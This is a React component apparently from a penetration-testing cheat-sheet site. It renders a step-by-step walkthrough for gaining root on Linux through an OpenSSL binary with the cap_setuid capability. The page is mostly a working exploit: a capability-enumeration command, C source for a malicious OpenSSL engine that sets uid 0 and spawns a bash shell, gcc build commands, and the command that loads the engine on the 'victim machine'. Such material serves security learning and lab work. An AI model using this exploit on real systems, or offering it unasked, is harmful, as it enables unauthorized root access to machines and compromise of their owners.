import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const OpenSSL = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Check if{" "}
              <Typography display="inline" className="highlight">
                Openssl
              </Typography>{" "}
              has capabilities. Normally,{" "}
              <Typography display="inline" className="highlight">
                https://gtfobins.github.io
              </Typography>{" "}
              would have a privesc like this, but it does not. Full exploit can
              be followed here:{" "}
              <Typography display="inline" className="highlight">
                https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/
              </Typography>
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"getcap -r / 2>/dev/null"}
            </SyntaxHighlighter>
            <Image
              src="/openssl.png"
              height={109}
              width={479}
              priority={true}
            />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              We will need{" "}
              <Typography display="inline" className="highlight">
                #include &lt;openssl/engine.h&gt;
              </Typography>{" "}
              header and{" "}
              <Typography display="inline" className="highlight">
                gcc
              </Typography>{" "}
              installed on your attacker system.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <SyntaxHighlighter className="syntax" language="C">
              {"#include <openssl/engine.h>\n\n" +
                "static int bind(ENGINE *e, const char *id)\n" +
                "{\n" +
                "    setuid(0); setgid(0);\n" +
                '    system("/bin/bash");\n' +
                "}\n\n" +
                "IMPLEMENT_DYNAMIC_BIND_FN(bind)\n" +
                "IMPLEMENT_DYNAMIC_CHECK_FN()"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>Compile the file</Typography>
            <SyntaxHighlighter className="syntax" language="C">
              {"gcc -fPIC -o exploit.o -c exploit.c"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="C">
              {"gcc -shared -o exploit.so -lcrypto exploit.o"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Transfer the file to the victim machine and execute the exploit
            </Typography>
            <SyntaxHighlighter className="syntax" language="C">
              {"openssl req -engine ./exploit.so"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default OpenSSL;
